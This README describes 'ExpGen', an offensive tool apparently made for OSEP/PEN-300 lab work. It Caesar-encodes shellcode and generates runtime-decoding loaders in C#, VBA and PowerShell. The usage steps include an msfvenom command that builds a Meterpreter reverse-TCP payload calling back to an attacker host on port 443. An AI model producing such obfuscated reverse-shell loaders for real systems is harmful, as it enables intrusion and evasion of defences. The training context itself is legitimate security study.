# ExpGen
Exploit Generator tool for OSEP put together by me using PEN-300 lab contents.

It does a simple caesar cipher encryption of the bytes and decrypt them during runtime. It supports CSharp, VBA and PS.

# Usage
1. Generate a meterpreter payload in raw format. Place it inside the payload folder.
  - msfvenom -p windowsx/64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f raw -o reversex64.bin
2. python3 gen.py

The python script will read all files as bytes inside the payload folder and generate the code based on the templates found inside the template folder.

The output will be inside the code folder inside ps/vba/cs folder respectively for each type.
